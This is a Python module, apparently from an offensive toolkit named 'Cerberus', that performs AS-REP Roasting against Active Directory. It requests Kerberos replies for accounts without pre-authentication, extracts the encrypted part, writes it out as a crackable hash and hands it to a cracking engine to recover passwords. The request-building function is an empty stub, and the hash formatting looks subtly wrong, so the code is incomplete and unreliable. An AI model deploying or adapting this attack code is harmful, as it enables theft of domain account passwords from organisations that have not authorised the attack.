#!/usr/bin/env python3
"""
AS-REP Roasting module for Cerberus
"""

from impacket.krb5.asn1 import AS_REP
from impacket.krb5.kerberosv5 import sendReceive
from impacket.krb5 import constants
from impacket.krb5.types import Principal
from pyasn1.codec.ber import encoder, decoder
from core.utils import print_status, print_success, print_error, random_delay, write_to_file
from modules.cracker import CrackEngine

class ASREPRoaster:
    def __init__(self, domain, dc_ip):
        self.domain = domain
        self.dc_ip = dc_ip
        self.cracker = CrackEngine()
        
    def attack(self, target_user):
        """Perform AS-REP Roasting attack on a target user"""
        print_status(f"Attempting AS-REP Roasting attack on {target_user}")
        
        try:
            # Create principal for the target user
            principal = Principal(target_user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            
            # Build AS-REQ without pre-authentication
            as_req = self.build_as_req(principal)
            
            # Send the request and get the response
            response = sendReceive(as_req, self.domain, self.dc_ip)
            
            # Parse the AS-REP
            as_rep = decoder.decode(response, asn1Spec=AS_REP())[0]
            
            # Extract the encrypted part
            encrypted_data = as_rep['enc-part']['cipher']
            encryption_type = as_rep['enc-part']['etype']
            
            # Format the hash for cracking
            hash_string = f"$krb5asrep${encryption_type}${target_user}@{self.domain}:{encrypted_data.hex()}"
            
            # Save hash to file
            hash_file = write_to_file(f"asreproast_{target_user}.hash", hash_string)
            print_success(f"AS-REP hash saved to: {hash_file}")
            
            # Attempt to crack the hash
            print_status(f"Attempting to crack AS-REP hash for {target_user}")
            cracked_password = self.cracker.crack_hash(hash_string, "kerberos")
            
            if cracked_password:
                print_success(f"Successfully cracked password for {target_user}: {cracked_password}")
                return cracked_password
            else:
                print_error(f"Failed to crack password for {target_user}")
                return None
                
        except Exception as e:
            print_error(f"AS-REP Roasting attack failed: {str(e)}")
            return None
            
    def build_as_req(self, principal):
        """Build AS-REQ without pre-authentication"""
        # This is a simplified version - in practice, you'd use impacket's internal methods
        # For a complete implementation, refer to impacket's getKerberosTGT without pre-auth
        pass